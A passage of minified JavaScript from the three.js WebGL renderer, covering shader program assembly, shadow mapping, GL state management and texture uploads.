USE_FOG\":\"\",r.useFog&&r.fogExp?\"#define FOG_EXP2\":\"\",r.map?\"#define USE_MAP\":\n\"\",r.envMap?\"#define USE_ENVMAP\":\"\",r.envMap?\"#define \"+E:\"\",r.envMap?\"#define \"+z:\"\",r.envMap?\"#define \"+y:\"\",r.lightMap?\"#define USE_LIGHTMAP\":\"\",r.aoMap?\"#define USE_AOMAP\":\"\",r.emissiveMap?\"#define USE_EMISSIVEMAP\":\"\",r.bumpMap?\"#define USE_BUMPMAP\":\"\",r.normalMap?\"#define USE_NORMALMAP\":\"\",r.specularMap?\"#define USE_SPECULARMAP\":\"\",r.roughnessMap?\"#define USE_ROUGHNESSMAP\":\"\",r.metalnessMap?\"#define USE_METALNESSMAP\":\"\",r.alphaMap?\"#define USE_ALPHAMAP\":\"\",r.vertexColors?\"#define USE_COLOR\":\n\"\",r.flatShading?\"#define FLAT_SHADED\":\"\",r.doubleSided?\"#define DOUBLE_SIDED\":\"\",r.flipSided?\"#define FLIP_SIDED\":\"\",\"#define NUM_CLIPPING_PLANES \"+r.numClippingPlanes,r.shadowMapEnabled?\"#define USE_SHADOWMAP\":\"\",r.shadowMapEnabled?\"#define \"+w:\"\",r.premultipliedAlpha?\"#define PREMULTIPLIED_ALPHA\":\"\",r.physicallyCorrectLights?\"#define PHYSICALLY_CORRECT_LIGHTS\":\"\",r.logarithmicDepthBuffer?\"#define USE_LOGDEPTHBUF\":\"\",r.logarithmicDepthBuffer&&a.extensions.get(\"EXT_frag_depth\")?\"#define USE_LOGDEPTHBUF_EXT\":\n\"\",r.envMap&&a.extensions.get(\"EXT_shader_texture_lod\")?\"#define TEXTURE_LOD_EXT\":\"\",\"uniform mat4 viewMatrix;\",\"uniform vec3 cameraPosition;\",r.toneMapping!==THREE.NoToneMapping?\"#define TONE_MAPPING\":\"\",r.toneMapping!==THREE.NoToneMapping?THREE.ShaderChunk.tonemapping_pars_fragment:\"\",r.toneMapping!==THREE.NoToneMapping?d(\"toneMapping\",r.toneMapping):\"\",r.outputEncoding||r.mapEncoding||r.envMapEncoding||r.emissiveMapEncoding?THREE.ShaderChunk.encodings_pars_fragment:\"\",r.mapEncoding?b(\"mapTexelToLinear\",\nr.mapEncoding):\"\",r.envMapEncoding?b(\"envMapTexelToLinear\",r.envMapEncoding):\"\",r.emissiveMapEncoding?b(\"emissiveMapTexelToLinear\",r.emissiveMapEncoding):\"\",r.outputEncoding?c(\"linearToOutputTexel\",r.outputEncoding):\"\",r.depthPacking?\"#define DEPTH_PACKING \"+q.depthPacking:\"\",\"\\n\"].filter(g).join(\"\\n\"));v=k(v,r);v=h(v,r);C=k(C,r);C=h(C,r);!1===q instanceof THREE.ShaderMaterial&&(v=l(v),C=l(C));C=w+C;v=THREE.WebGLShader(s,s.VERTEX_SHADER,u+v);C=THREE.WebGLShader(s,s.FRAGMENT_SHADER,C);s.attachShader(B,\nv);s.attachShader(B,C);void 0!==q.index0AttributeName?s.bindAttribLocation(B,0,q.index0AttributeName):!0===r.morphTargets&&s.bindAttribLocation(B,0,\"position\");s.linkProgram(B);r=s.getProgramInfoLog(B);E=s.getShaderInfoLog(v);z=s.getShaderInfoLog(C);A=y=!0;if(!1===s.getProgramParameter(B,s.LINK_STATUS))y=!1,console.error(\"THREE.WebGLProgram: shader error: \",s.getError(),\"gl.VALIDATE_STATUS\",s.getProgramParameter(B,s.VALIDATE_STATUS),\"gl.getProgramInfoLog\",r,E,z);else if(\"\"!==r)console.warn(\"THREE.WebGLProgram: gl.getProgramInfoLog()\",\nr);else if(\"\"===E||\"\"===z)A=!1;A&&(this.diagnostics={runnable:y,material:q,programLog:r,vertexShader:{log:E,prefix:u},fragmentShader:{log:z,prefix:w}});s.deleteShader(v);s.deleteShader(C);var F;this.getUniforms=function(){void 0===F&&(F=new THREE.WebGLUniforms(s,B,a));return F};var K;this.getAttributes=function(){if(void 0===K){for(var a={},b=s.getProgramParameter(B,s.ACTIVE_ATTRIBUTES),c=0;c<b;c++){var d=s.getActiveAttrib(B,c).name;a[d]=s.getAttribLocation(B,d)}K=a}return K};this.destroy=function(){s.deleteProgram(B);\nthis.program=void 0};Object.defineProperties(this,{uniforms:{get:function(){console.warn(\"THREE.WebGLProgram: .uniforms is now .getUniforms().\");return this.getUniforms()}},attributes:{get:function(){console.warn(\"THREE.WebGLProgram: .attributes is now .getAttributes().\");return this.getAttributes()}}});this.id=n++;this.code=m;this.usedTimes=1;this.program=B;this.vertexShader=v;this.fragmentShader=C;return this}}();\nTHREE.WebGLPrograms=function(a,b){function c(a,b){var c;a?a instanceof THREE.Texture?c=a.encoding:a instanceof THREE.WebGLRenderTarget&&(console.warn(\"THREE.WebGLPrograms.getTextureEncodingFromMap: don't use render targets as textures. Use their .texture property instead.\"),c=a.texture.encoding):c=THREE.LinearEncoding;c===THREE.LinearEncoding&&b&&(c=THREE.GammaEncoding);return c}var d=[],e={MeshDepthMaterial:\"depth\",MeshNormalMaterial:\"normal\",MeshBasicMaterial:\"basic\",MeshLambertMaterial:\"lambert\",\nMeshPhongMaterial:\"phong\",MeshStandardMaterial:\"physical\",MeshPhysicalMaterial:\"physical\",LineBasicMaterial:\"basic\",LineDashedMaterial:\"dashed\",PointsMaterial:\"points\"},f=\"precision supportsVertexTextures map mapEncoding envMap envMapMode envMapEncoding lightMap aoMap emissiveMap emissiveMapEncoding bumpMap normalMap displacementMap specularMap roughnessMap metalnessMap alphaMap combine vertexColors fog useFog fogExp flatShading sizeAttenuation logarithmicDepthBuffer skinning maxBones useVertexTexture morphTargets morphNormals maxMorphTargets maxMorphNormals premultipliedAlpha numDirLights numPointLights numSpotLights numHemiLights shadowMapEnabled shadowMapType toneMapping physicallyCorrectLights alphaTest doubleSided flipSided numClippingPlanes depthPacking\".split(\" \");\nthis.getParameters=function(d,f,k,l,n){var p=e[d.type],m;b.floatVertexTextures&&n&&n.skeleton&&n.skeleton.useVertexTexture?m=1024:(m=Math.floor((b.maxVertexUniforms-20)/4),void 0!==n&&n instanceof THREE.SkinnedMesh&&(m=Math.min(n.skeleton.bones.length,m),m<n.skeleton.bones.length&&console.warn(\"WebGLRenderer: too many bones - \"+n.skeleton.bones.length+\", this GPU supports just \"+m+\" (try OpenGL instead of ANGLE)\")));var q=a.getPrecision();null!==d.precision&&(q=b.getMaxPrecision(d.precision),q!==\nd.precision&&console.warn(\"THREE.WebGLProgram.getParameters:\",d.precision,\"not supported, using\",q,\"instead.\"));var r=a.getCurrentRenderTarget();return{shaderID:p,precision:q,supportsVertexTextures:b.vertexTextures,outputEncoding:c(r?r.texture:null,a.gammaOutput),map:!!d.map,mapEncoding:c(d.map,a.gammaInput),envMap:!!d.envMap,envMapMode:d.envMap&&d.envMap.mapping,envMapEncoding:c(d.envMap,a.gammaInput),envMapCubeUV:!!d.envMap&&(d.envMap.mapping===THREE.CubeUVReflectionMapping||d.envMap.mapping===\nTHREE.CubeUVRefractionMapping),lightMap:!!d.lightMap,aoMap:!!d.aoMap,emissiveMap:!!d.emissiveMap,emissiveMapEncoding:c(d.emissiveMap,a.gammaInput),bumpMap:!!d.bumpMap,normalMap:!!d.normalMap,displacementMap:!!d.displacementMap,roughnessMap:!!d.roughnessMap,metalnessMap:!!d.metalnessMap,specularMap:!!d.specularMap,alphaMap:!!d.alphaMap,combine:d.combine,vertexColors:d.vertexColors,fog:k,useFog:d.fog,fogExp:k instanceof THREE.FogExp2,flatShading:d.shading===THREE.FlatShading,sizeAttenuation:d.sizeAttenuation,\nlogarithmicDepthBuffer:b.logarithmicDepthBuffer,skinning:d.skinning,maxBones:m,useVertexTexture:b.floatVertexTextures&&n&&n.skeleton&&n.skeleton.useVertexTexture,morphTargets:d.morphTargets,morphNormals:d.morphNormals,maxMorphTargets:a.maxMorphTargets,maxMorphNormals:a.maxMorphNormals,numDirLights:f.directional.length,numPointLights:f.point.length,numSpotLights:f.spot.length,numHemiLights:f.hemi.length,numClippingPlanes:l,shadowMapEnabled:a.shadowMap.enabled&&n.receiveShadow&&0<f.shadows.length,shadowMapType:a.shadowMap.type,\ntoneMapping:a.toneMapping,physicallyCorrectLights:a.physicallyCorrectLights,premultipliedAlpha:d.premultipliedAlpha,alphaTest:d.alphaTest,doubleSided:d.side===THREE.DoubleSide,flipSided:d.side===THREE.BackSide,depthPacking:void 0!==d.depthPacking?d.depthPacking:!1}};this.getProgramCode=function(a,b){var c=[];b.shaderID?c.push(b.shaderID):(c.push(a.fragmentShader),c.push(a.vertexShader));if(void 0!==a.defines)for(var d in a.defines)c.push(d),c.push(a.defines[d]);for(d=0;d<f.length;d++)c.push(b[f[d]]);\nreturn c.join()};this.acquireProgram=function(b,c,e){for(var f,n=0,p=d.length;n<p;n++){var m=d[n];if(m.code===e){f=m;++f.usedTimes;break}}void 0===f&&(f=new THREE.WebGLProgram(a,e,b,c),d.push(f));return f};this.releaseProgram=function(a){if(0===--a.usedTimes){var b=d.indexOf(a);d[b]=d[d.length-1];d.pop();a.destroy()}};this.programs=d};\nTHREE.WebGLProperties=function(){var a={};this.get=function(b){b=b.uuid;var c=a[b];void 0===c&&(c={},a[b]=c);return c};this.delete=function(b){delete a[b.uuid]};this.clear=function(){a={}}};\nTHREE.WebGLShader=function(){function a(a){a=a.split(\"\\n\");for(var c=0;c<a.length;c++)a[c]=c+1+\": \"+a[c];return a.join(\"\\n\")}return function(b,c,d){var e=b.createShader(c);b.shaderSource(e,d);b.compileShader(e);!1===b.getShaderParameter(e,b.COMPILE_STATUS)&&console.error(\"THREE.WebGLShader: Shader couldn't compile.\");\"\"!==b.getShaderInfoLog(e)&&console.warn(\"THREE.WebGLShader: gl.getShaderInfoLog()\",c===b.VERTEX_SHADER?\"vertex\":\"fragment\",b.getShaderInfoLog(e),a(d));return e}}();\nTHREE.WebGLShadowMap=function(a,b,c){function d(b,c,d,e){var f=b.geometry,g=null,g=r,h=b.customDepthMaterial;d&&(g=s,h=b.customDistanceMaterial);h?g=h:(b=b instanceof THREE.SkinnedMesh&&c.skinning,h=0,void 0!==f.morphTargets&&0<f.morphTargets.length&&c.morphTargets&&(h|=1),b&&(h|=2),g=g[h]);a.localClippingEnabled&&!0===c.clipShadows&&0!==c.clippingPlanes.length&&(h=g.uuid,f=c.uuid,b=t[h],void 0===b&&(b={},t[h]=b),h=b[f],void 0===h&&(h=g.clone(),b[f]=h),g=h);g.visible=c.visible;g.wireframe=c.wireframe;\nf=c.side;B.renderSingleSided&&f==THREE.DoubleSide&&(f=THREE.FrontSide);B.renderReverseSided&&(f===THREE.FrontSide?f=THREE.BackSide:f===THREE.BackSide&&(f=THREE.FrontSide));g.side=f;g.clipShadows=c.clipShadows;g.clippingPlanes=c.clippingPlanes;g.wireframeLinewidth=c.wireframeLinewidth;g.linewidth=c.linewidth;d&&void 0!==g.uniforms.lightPos&&g.uniforms.lightPos.value.copy(e);return g}function e(a,b,c){if(!1!==a.visible){a.layers.test(b.layers)&&(a instanceof THREE.Mesh||a instanceof THREE.Line||a instanceof\nTHREE.Points)&&a.castShadow&&(!1===a.frustumCulled||!0===h.intersectsObject(a))&&!0===a.material.visible&&(a.modelViewMatrix.multiplyMatrices(c.matrixWorldInverse,a.matrixWorld),q.push(a));a=a.children;for(var d=0,f=a.length;d<f;d++)e(a[d],b,c)}}var f=a.context,g=a.state,h=new THREE.Frustum,k=new THREE.Matrix4,l=b.shadows,n=new THREE.Vector2,p=new THREE.Vector3,m=new THREE.Vector3,q=[],r=Array(4),s=Array(4),t={},u=[new THREE.Vector3(1,0,0),new THREE.Vector3(-1,0,0),new THREE.Vector3(0,0,1),new THREE.Vector3(0,\n0,-1),new THREE.Vector3(0,1,0),new THREE.Vector3(0,-1,0)],v=[new THREE.Vector3(0,1,0),new THREE.Vector3(0,1,0),new THREE.Vector3(0,1,0),new THREE.Vector3(0,1,0),new THREE.Vector3(0,0,1),new THREE.Vector3(0,0,-1)],C=[new THREE.Vector4,new THREE.Vector4,new THREE.Vector4,new THREE.Vector4,new THREE.Vector4,new THREE.Vector4];b=new THREE.MeshDepthMaterial;b.depthPacking=THREE.RGBADepthPacking;b.clipping=!0;for(var w=THREE.ShaderLib.distanceRGBA,E=THREE.UniformsUtils.clone(w.uniforms),z=0;4!==z;++z){var y=\n0!==(z&1),A=0!==(z&2),I=b.clone();I.morphTargets=y;I.skinning=A;r[z]=I;y=new THREE.ShaderMaterial({defines:{USE_SHADOWMAP:\"\"},uniforms:E,vertexShader:w.vertexShader,fragmentShader:w.fragmentShader,morphTargets:y,skinning:A,clipping:!0});s[z]=y}var B=this;this.enabled=!1;this.autoUpdate=!0;this.needsUpdate=!1;this.type=THREE.PCFShadowMap;this.renderSingleSided=this.renderReverseSided=!0;this.render=function(b,r){if(!1!==B.enabled&&(!1!==B.autoUpdate||!1!==B.needsUpdate)&&0!==l.length){g.clearColor(1,\n1,1,1);g.disable(f.BLEND);g.setDepthTest(!0);g.setScissorTest(!1);for(var w,s,t=0,y=l.length;t<y;t++){var z=l[t],A=z.shadow;if(void 0===A)console.warn(\"THREE.WebGLShadowMap:\",z,\"has no shadow.\");else{var E=A.camera;n.copy(A.mapSize);if(z instanceof THREE.PointLight){w=6;s=!0;var J=n.x,D=n.y;C[0].set(2*J,D,J,D);C[1].set(0,D,J,D);C[2].set(3*J,D,J,D);C[3].set(J,D,J,D);C[4].set(3*J,0,J,D);C[5].set(J,0,J,D);n.x*=4;n.y*=2}else w=1,s=!1;null===A.map&&(A.map=new THREE.WebGLRenderTarget(n.x,n.y,{minFilter:THREE.NearestFilter,\nmagFilter:THREE.NearestFilter,format:THREE.RGBAFormat}),E.updateProjectionMatrix());A instanceof THREE.SpotLightShadow&&A.update(z);J=A.map;A=A.matrix;m.setFromMatrixPosition(z.matrixWorld);E.position.copy(m);a.setRenderTarget(J);a.clear();for(J=0;J<w;J++){s?(p.copy(E.position),p.add(u[J]),E.up.copy(v[J]),E.lookAt(p),g.viewport(C[J])):(p.setFromMatrixPosition(z.target.matrixWorld),E.lookAt(p));E.updateMatrixWorld();E.matrixWorldInverse.getInverse(E.matrixWorld);A.set(.5,0,0,.5,0,.5,0,.5,0,0,.5,.5,\n0,0,0,1);A.multiply(E.projectionMatrix);A.multiply(E.matrixWorldInverse);k.multiplyMatrices(E.projectionMatrix,E.matrixWorldInverse);h.setFromMatrix(k);q.length=0;e(b,r,E);for(var D=0,G=q.length;D<G;D++){var I=q[D],T=c.update(I),X=I.material;if(X instanceof THREE.MultiMaterial)for(var ja=T.groups,X=X.materials,ba=0,ia=ja.length;ba<ia;ba++){var V=ja[ba],Y=X[V.materialIndex];!0===Y.visible&&(Y=d(I,Y,s,m),a.renderBufferDirect(E,null,T,Y,I,V))}else Y=d(I,X,s,m),a.renderBufferDirect(E,null,T,Y,I,null)}}}}w=\na.getClearColor();s=a.getClearAlpha();a.setClearColor(w,s);B.needsUpdate=!1}}};\nTHREE.WebGLState=function(a,b,c){function d(b,c,d){var e=new Uint8Array(4),f=a.createTexture();a.bindTexture(b,f);a.texParameteri(b,a.TEXTURE_MIN_FILTER,a.NEAREST);a.texParameteri(b,a.TEXTURE_MAG_FILTER,a.NEAREST);for(b=0;b<d;b++)a.texImage2D(c+b,0,a.RGBA,1,1,0,a.RGBA,a.UNSIGNED_BYTE,e);return f}var e=this;this.buffers={color:new THREE.WebGLColorBuffer(a,this),depth:new THREE.WebGLDepthBuffer(a,this),stencil:new THREE.WebGLStencilBuffer(a,this)};var f=a.getParameter(a.MAX_VERTEX_ATTRIBS),g=new Uint8Array(f),\nh=new Uint8Array(f),k=new Uint8Array(f),l={},n=null,p=null,m=null,q=null,r=null,s=null,t=null,u=null,v=!1,C=null,w=null,E=null,z=null,y=null,A=null,I=a.getParameter(a.MAX_TEXTURE_IMAGE_UNITS),B=null,F={},K=new THREE.Vector4,P=new THREE.Vector4,M={};M[a.TEXTURE_2D]=d(a.TEXTURE_2D,a.TEXTURE_2D,1);M[a.TEXTURE_CUBE_MAP]=d(a.TEXTURE_CUBE_MAP,a.TEXTURE_CUBE_MAP_POSITIVE_X,6);this.init=function(){this.clearColor(0,0,0,1);this.clearDepth(1);this.clearStencil(0);this.enable(a.DEPTH_TEST);this.setDepthFunc(THREE.LessEqualDepth);\nthis.setFlipSided(!1);this.setCullFace(THREE.CullFaceBack);this.enable(a.CULL_FACE);this.enable(a.BLEND);this.setBlending(THREE.NormalBlending)};this.initAttributes=function(){for(var a=0,b=g.length;a<b;a++)g[a]=0};this.enableAttribute=function(c){g[c]=1;0===h[c]&&(a.enableVertexAttribArray(c),h[c]=1);0!==k[c]&&(b.get(\"ANGLE_instanced_arrays\").vertexAttribDivisorANGLE(c,0),k[c]=0)};this.enableAttributeAndDivisor=function(b,c,d){g[b]=1;0===h[b]&&(a.enableVertexAttribArray(b),h[b]=1);k[b]!==c&&(d.vertexAttribDivisorANGLE(b,\nc),k[b]=c)};this.disableUnusedAttributes=function(){for(var b=0,c=h.length;b!==c;++b)h[b]!==g[b]&&(a.disableVertexAttribArray(b),h[b]=0)};this.enable=function(b){!0!==l[b]&&(a.enable(b),l[b]=!0)};this.disable=function(b){!1!==l[b]&&(a.disable(b),l[b]=!1)};this.getCompressedTextureFormats=function(){if(null===n&&(n=[],b.get(\"WEBGL_compressed_texture_pvrtc\")||b.get(\"WEBGL_compressed_texture_s3tc\")||b.get(\"WEBGL_compressed_texture_etc1\")))for(var c=a.getParameter(a.COMPRESSED_TEXTURE_FORMATS),d=0;d<\nc.length;d++)n.push(c[d]);return n};this.setBlending=function(b,d,e,f,g,h,k,l){if(b!==THREE.NoBlending){this.enable(a.BLEND);if(b!==p||l!==v)b===THREE.AdditiveBlending?l?(a.blendEquationSeparate(a.FUNC_ADD,a.FUNC_ADD),a.blendFuncSeparate(a.ONE,a.ONE,a.ONE,a.ONE)):(a.blendEquation(a.FUNC_ADD),a.blendFunc(a.SRC_ALPHA,a.ONE)):b===THREE.SubtractiveBlending?l?(a.blendEquationSeparate(a.FUNC_ADD,a.FUNC_ADD),a.blendFuncSeparate(a.ZERO,a.ZERO,a.ONE_MINUS_SRC_COLOR,a.ONE_MINUS_SRC_ALPHA)):(a.blendEquation(a.FUNC_ADD),\na.blendFunc(a.ZERO,a.ONE_MINUS_SRC_COLOR)):b===THREE.MultiplyBlending?l?(a.blendEquationSeparate(a.FUNC_ADD,a.FUNC_ADD),a.blendFuncSeparate(a.ZERO,a.SRC_COLOR,a.ZERO,a.SRC_ALPHA)):(a.blendEquation(a.FUNC_ADD),a.blendFunc(a.ZERO,a.SRC_COLOR)):l?(a.blendEquationSeparate(a.FUNC_ADD,a.FUNC_ADD),a.blendFuncSeparate(a.ONE,a.ONE_MINUS_SRC_ALPHA,a.ONE,a.ONE_MINUS_SRC_ALPHA)):(a.blendEquationSeparate(a.FUNC_ADD,a.FUNC_ADD),a.blendFuncSeparate(a.SRC_ALPHA,a.ONE_MINUS_SRC_ALPHA,a.ONE,a.ONE_MINUS_SRC_ALPHA)),\np=b,v=l;if(b===THREE.CustomBlending){g=g||d;h=h||e;k=k||f;if(d!==m||g!==s)a.blendEquationSeparate(c(d),c(g)),m=d,s=g;if(e!==q||f!==r||h!==t||k!==u)a.blendFuncSeparate(c(e),c(f),c(h),c(k)),q=e,r=f,t=h,u=k}else u=t=s=r=q=m=null}else this.disable(a.BLEND),p=b};this.setColorWrite=function(a){this.buffers.color.setMask(a)};this.setDepthTest=function(a){this.buffers.depth.setTest(a)};this.setDepthWrite=function(a){this.buffers.depth.setMask(a)};this.setDepthFunc=function(a){this.buffers.depth.setFunc(a)};\nthis.setStencilTest=function(a){this.buffers.stencil.setTest(a)};this.setStencilWrite=function(a){this.buffers.stencil.setMask(a)};this.setStencilFunc=function(a,b,c){this.buffers.stencil.setFunc(a,b,c)};this.setStencilOp=function(a,b,c){this.buffers.stencil.setOp(a,b,c)};this.setFlipSided=function(b){C!==b&&(b?a.frontFace(a.CW):a.frontFace(a.CCW),C=b)};this.setCullFace=function(b){b!==THREE.CullFaceNone?(this.enable(a.CULL_FACE),b!==w&&(b===THREE.CullFaceBack?a.cullFace(a.BACK):b===THREE.CullFaceFront?\na.cullFace(a.FRONT):a.cullFace(a.FRONT_AND_BACK))):this.disable(a.CULL_FACE);w=b};this.setLineWidth=function(b){b!==E&&(a.lineWidth(b),E=b)};this.setPolygonOffset=function(b,c,d){if(b){if(this.enable(a.POLYGON_OFFSET_FILL),z!==c||y!==d)a.polygonOffset(c,d),z=c,y=d}else this.disable(a.POLYGON_OFFSET_FILL)};this.getScissorTest=function(){return A};this.setScissorTest=function(b){(A=b)?this.enable(a.SCISSOR_TEST):this.disable(a.SCISSOR_TEST)};this.activeTexture=function(b){void 0===b&&(b=a.TEXTURE0+\nI-1);B!==b&&(a.activeTexture(b),B=b)};this.bindTexture=function(b,c){null===B&&e.activeTexture();var d=F[B];void 0===d&&(d={type:void 0,texture:void 0},F[B]=d);if(d.type!==b||d.texture!==c)a.bindTexture(b,c||M[b]),d.type=b,d.texture=c};this.compressedTexImage2D=function(){try{a.compressedTexImage2D.apply(a,arguments)}catch(b){console.error(b)}};this.texImage2D=function(){try{a.texImage2D.apply(a,arguments)}catch(b){console.error(b)}};this.clearColor=function(a,b,c,d){this.buffers.color.setClear(a,\nb,c,d)};this.clearDepth=function(a){this.buffers.depth.setClear(a)};this.clearStencil=function(a){this.buffers.stencil.setClear(a)};this.scissor=function(b){!1===K.equals(b)&&(a.scissor(b.x,b.y,b.z,b.w),K.copy(b))};this.viewport=function(b){!1===P.equals(b)&&(a.viewport(b.x,b.y,b.z,b.w),P.copy(b))};this.reset=function(){for(var b=0;b<h.length;b++)1===h[b]&&(a.disableVertexAttribArray(b),h[b]=0);l={};B=n=null;F={};w=C=p=null;this.buffers.color.reset();this.buffers.depth.reset();this.buffers.stencil.reset()}};\nTHREE.WebGLColorBuffer=function(a,b){var c=!1,d=new THREE.Vector4,e=null,f=new THREE.Vector4;this.setMask=function(b){e===b||c||(a.colorMask(b,b,b,b),e=b)};this.setLocked=function(a){c=a};this.setClear=function(b,c,e,l){d.set(b,c,e,l);!1===f.equals(d)&&(a.clearColor(b,c,e,l),f.copy(d))};this.reset=function(){c=!1;e=null;f=new THREE.Vector4}};\nTHREE.WebGLDepthBuffer=function(a,b){var c=!1,d=null,e=null,f=null;this.setTest=function(c){c?b.enable(a.DEPTH_TEST):b.disable(a.DEPTH_TEST)};this.setMask=function(b){d===b||c||(a.depthMask(b),d=b)};this.setFunc=function(b){if(e!==b){if(b)switch(b){case THREE.NeverDepth:a.depthFunc(a.NEVER);break;case THREE.AlwaysDepth:a.depthFunc(a.ALWAYS);break;case THREE.LessDepth:a.depthFunc(a.LESS);break;case THREE.LessEqualDepth:a.depthFunc(a.LEQUAL);break;case THREE.EqualDepth:a.depthFunc(a.EQUAL);break;case THREE.GreaterEqualDepth:a.depthFunc(a.GEQUAL);\nbreak;case THREE.GreaterDepth:a.depthFunc(a.GREATER);break;case THREE.NotEqualDepth:a.depthFunc(a.NOTEQUAL);break;default:a.depthFunc(a.LEQUAL)}else a.depthFunc(a.LEQUAL);e=b}};this.setLocked=function(a){c=a};this.setClear=function(b){f!==b&&(a.clearDepth(b),f=b)};this.reset=function(){c=!1;f=e=d=null}};\nTHREE.WebGLStencilBuffer=function(a,b){var c=!1,d=null,e=null,f=null,g=null,h=null,k=null,l=null,n=null;this.setTest=function(c){c?b.enable(a.STENCIL_TEST):b.disable(a.STENCIL_TEST)};this.setMask=function(b){d===b||c||(a.stencilMask(b),d=b)};this.setFunc=function(b,c,d){if(e!==b||f!==c||g!==d)a.stencilFunc(b,c,d),e=b,f=c,g=d};this.setOp=function(b,c,d){if(h!==b||k!==c||l!==d)a.stencilOp(b,c,d),h=b,k=c,l=d};this.setLocked=function(a){c=a};this.setClear=function(b){n!==b&&(a.clearStencil(b),n=b)};this.reset=\nfunction(){c=!1;n=l=k=h=g=f=e=d=null}};\nTHREE.WebGLTextures=function(a,b,c,d,e,f,g){function h(a,b){if(a.width>b||a.height>b){var c=b/Math.max(a.width,a.height),d=document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"canvas\");d.width=Math.floor(a.width*c);d.height=Math.floor(a.height*c);d.getContext(\"2d\").drawImage(a,0,0,a.width,a.height,0,0,d.width,d.height);console.warn(\"THREE.WebGLRenderer: image is too big (\"+a.width+\"x\"+a.height+\"). Resized to \"+d.width+\"x\"+d.height,a);return d}return a}function k(a){return THREE.Math.isPowerOfTwo(a.width)&&THREE.Math.isPowerOfTwo(a.height)}\nfunction l(b){return b===THREE.NearestFilter||b===THREE.NearestMipMapNearestFilter||b===THREE.NearestMipMapLinearFilter?a.NEAREST:a.LINEAR}function n(b){b=b.target;b.removeEventListener(\"dispose\",n);a:{var c=d.get(b);if(b.image&&c.__image__webglTextureCube)a.deleteTexture(c.__image__webglTextureCube);else{if(void 0===c.__webglInit)break a;a.deleteTexture(c.__webglTexture)}d.delete(b)}t.textures--}function p(b){b=b.target;b.removeEventListener(\"dispose\",p);var c=d.get(b),e=d.get(b.texture);if(b){void 0!==\ne.__webglTexture&&a.deleteTexture(e.__webglTexture);b.depthTexture&&b.depthTexture.dispose();if(b instanceof THREE.WebGLRenderTargetCube)for(e=0;6>e;e++)a.deleteFramebuffer(c.__webglFramebuffer[e]),c.__webglDepthbuffer&&a.deleteRenderbuffer(c.__webglDepthbuffer[e]);else a.deleteFramebuffer(c.__webglFramebuffer),c.__webglDepthbuffer&&a.deleteRenderbuffer(c.__webglDepthbuffer);d.delete(b.texture);d.delete(b)}t.textures--}function m(b,g){var m=d.get(b);if(0<b.version&&m.__version!==b.version){var l=\nb.image;if(void 0===l)console.warn(\"THREE.WebGLRenderer: Texture marked for update but image is undefined\",b);else if(!1===l.complete)console.warn(\"THREE.WebGLRenderer: Texture marked for update but image is incomplete\",b);else{void 0===m.__webglInit&&(m.__webglInit=!0,b.addEventListener(\"dispose\",n),m.__webglTexture=a.createTexture(),t.textures++);c.activeTexture(a.TEXTURE0+g);c.bindTexture(a.TEXTURE_2D,m.__webglTexture);a.pixelStorei(a.UNPACK_FLIP_Y_WEBGL,b.flipY);a.pixelStorei(a.UNPACK_PREMULTIPLY_ALPHA_WEBGL,\nb.premultiplyAlpha);a.pixelStorei(a.UNPACK_ALIGNMENT,b.unpackAlignment);var p=h(b.image,e.maxTextureSize);if((b.wrapS!==THREE.ClampToEdgeWrapping||b.wrapT!==THREE.ClampToEdgeWrapping||b.minFilter!==THREE.NearestFilter&&b.minFilter!==THREE.LinearFilter)&&!1===k(p))if(l=p,l instanceof HTMLImageElement||l instanceof HTMLCanvasElement){var r=document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"canvas\");r.width=THREE.Math.nearestPowerOfTwo(l.width);r.height=THREE.Math.nearestPowerOfTwo(l.height);r.getContext(\"2d\").drawImage(l,\n0,0,r.width,r.height);console.warn(\"THREE.WebGLRenderer: image is not power of two (\"+l.width+\"x\"+l.height+\"). Resized to \"+r.width+\"x\"+r.height,l);p=r}else p=l;var l=k(p),r=f(b.format),s=f(b.type);q(a.TEXTURE_2D,b,l);var I=b.mipmaps;if(b instanceof THREE.DepthTexture){I=a.DEPTH_COMPONENT;if(b.type===THREE.FloatType){if(!u)throw Error(\"Float Depth Texture only supported in WebGL2.0\");I=a.DEPTH_COMPONENT32F}else u&&(I=a.DEPTH_COMPONENT16);c.texImage2D(a.TEXTURE_2D,0,I,p.width,p.height,0,r,s,null)}else if(b instanceof\nTHREE.DataTexture)if(0<I.length&&l){for(var B=0,F=I.length;B<F;B++)p=I[B],c.texImage2D(a.TEXTURE_2D,B,r,p.width,p.height,0,r,s,p.data);b.generateMipmaps=!1}else c.texImage2D(a.TEXTURE_2D,0,r,p.width,p.height,0,r,s,p.data);else if(b instanceof THREE.CompressedTexture)for(B=0,F=I.length;B<F;B++)p=I[B],b.format!==THREE.RGBAFormat&&b.format!==THREE.RGBFormat?-1<c.getCompressedTextureFormats().indexOf(r)?c.compressedTexImage2D(a.TEXTURE_2D,B,r,p.width,p.height,0,p.data):console.warn(\"THREE.WebGLRenderer: Attempt to load unsupported compressed texture format in .uploadTexture()\"):\nc.texImage2D(a.TEXTURE_2D,B,r,p.width,p.height,0,r,s,p.data);else if(0<I.length&&l){B=0;for(F=I.length;B<F;B++)p=I[B],c.texImage2D(a.TEXTURE_2D,B,r,r,s,p);b.generateMipmaps=!1}else c.texImage2D(a.TEXTURE_2D,0,r,r,s,p);b.generateMipmaps&&l&&a.generateMipmap(a.TEXTURE_2D);m.__version=b.version;if(b.onUpdate)b.onUpdate(b);return}}c.activeTexture(a.TEXTURE0+g);c.bindTexture(a.TEXTURE_2D,m.__webglTexture)}function q(c,g,h){h?(a.texParameteri(c,a.TEXTURE_WRAP_S,f(g.wrapS)),a.texParameteri(c,a.TEXTURE_WRAP_T,\nf(g.wrapT)),a.texParameteri(c,a.TEXTURE_MAG_FILTER,f(g.magFilter)),a.texParameteri(c,a.TEXTURE_MIN_FILTER,f(g.minFilter))):(a.texParameteri(c,a.TEXTURE_WRAP_S,a.CLAMP_TO_EDGE),a.texParameteri(c,a.TEXTURE_WRAP_T,a.CLAMP_TO_EDGE),g.wrapS===THREE.ClampToEdgeWrapping&&g.wrapT===THREE.ClampToEdgeWrapping||console.warn(\"THREE.WebGLRenderer: Texture is not power of two. Texture.wrapS and Texture.wrapT should be set to THREE.ClampToEdgeWrapping.\",g),a.texParameteri(c,a.TEXTURE_MAG_FILTER,l(g.magFilter)),\na.texParameteri(c,a.TEXTURE_MIN_FILTER,l(g.minFilter)),g.minFilter!==THREE.NearestFilter&&g.minFilter!==THREE.LinearFilter&&console.warn(\"THREE.WebGLRenderer: Texture is not power of two. Texture.minFilter should be set to THREE.NearestFilter or 